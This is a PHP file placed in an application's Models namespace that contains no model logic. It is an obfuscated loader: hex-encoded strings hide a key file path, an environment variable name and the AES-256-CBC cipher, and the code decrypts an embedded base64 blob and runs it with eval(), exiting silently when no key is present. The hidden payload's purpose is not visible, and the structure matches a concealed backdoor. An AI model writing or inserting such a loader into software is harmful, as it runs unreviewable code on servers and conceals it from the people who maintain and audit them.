<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('CNoRVffd+w0/pzJqAfojrg==');

$c=base64_decode(

'EyjPPEZcFbmhRuBvm0MQYrRZ5+SVXG3hF4w/YVMCBTJdUkHpD64L1JDeEVNlVousqHN0uPN5vZfv' .
'deKzpfdAjMpe0GUKNwcr74FUbIZByMdyfudrrS8Iy5UOCgvhQ75ybOvPaPyGEBY/6Z/iIaWygp5r' .
'YIg1HA6y3JBXUiJFEZQHtckYKtFfVDHR1D49GEt4nzs4L9UaOarNDolusm+a8Tj5gFT2jfOrhGJB' .
'SiNe/+iePR/F+jobjF8dTYJHp7+CsfA6C+QhW5yN2zTs04tZP0W6BGlnazK1Bgl2MjACqWs7AIg7' .
'tchPHHe7FzUihXafOjCW6lPLcdKIKDMTGS3Qr+EHikDNKmayUyum2PFVBngkMBHqmLFSksGT/n6h' .
'm33fVv15KSCFnFBHh22WrMOcAQjyvonmsnvBT3fSPrWVD6pdh0AT8JU/ORk5S9j6FQTv6rrCt02v' .
'fHtcdwt2DfHufayyaFMdAS/74JlH2UVXj5TUvtt5eQ9EPNt9VH8SXACWnm0/FAtX26IIkXADGqdv' .
'Ydq0gNOO7Z7QZYeqZU5Rxa66pWwbpusju/7Nhx6YRGQblKn0/duQrecQKUnwvHb8flIJEsZu8coG' .
'gu3juDrH1tAvpqTG2ZU5OP65Alxz7RM+kb5K5UidWnrmsSekWfmGQv/mm8rKjp/3O7Ri0JGSpsXW' .
'f26YDphxXieg75VGQuXVebbzlSh5utPnce4SJavVy1z+OdWsAOIg1Q5iq+34ND76W3WjwayGH1mq' .
'CzY9Jw8gBN8GFLYHXK0wEyaqWaoHwHBov5LDAWznp6j7MaWz/mg/4V4iTlqhEbz1e6eajJOr+Qou' .
'ZefNgM8ddRVT3qr4hTDlzNEERQ9PphqwW+Um9hIXvAMkSEvY8Uy3FtGpBldtSTs5L0xTss8rLZga' .
'qNePYg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

